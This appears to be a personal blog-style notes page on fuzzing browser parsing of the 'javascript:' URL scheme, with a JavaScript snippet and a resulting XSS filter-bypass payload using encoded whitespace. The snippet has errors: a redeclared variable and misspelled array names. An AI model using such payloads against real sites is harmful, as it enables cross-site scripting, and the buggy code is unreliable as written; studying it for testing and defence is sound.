---
title: 'Javascript Fuzzing Snippets - Notes '
description: 'Book notes'
pubDate: 'nov 20 2024'
heroImage: '/dabi.jpg'
pinned: false
---

### Fuzzing javascript scheme

```
log_endfuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `javascript${String.fromCodePoint(i)}:`;
    if(anchor.protocol === 'javascript:'){
        log_endfuzz.push(i)
    }

}


log_startfuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `${String.fromCodePoint(i)}javascript:`;
    if(anchor.protocol === 'javascript:'){
        log_startfuzz.push(i)
    }

}

log_middlefuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `java${String.fromCodePoint(i)}script:`;
    if(anchor.protocol === 'javascript:'){
        log_middlefuzz.push(i)
    }

}

//appending to body

for (let i of log_startfuzz){
    let anchor = document.createElement('a');
    anchor.href = `${String.fromCodePoint(i)}javascript:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}


for (let i of log_middlefuz){
    let anchor = document.createElement('a');
    anchor.href = `javas${String.fromCodePoint(i)}cript:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}


for (let i of log_endfuz){
    let anchor = document.createElement('a');
    anchor.href = `javascript${String.fromCodePoint(i)}:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}
```

- With the help of fuzzing we created a payload! `<a href="&#32;javas&#13;cript&#9;:alert()">click me</a>` which works.

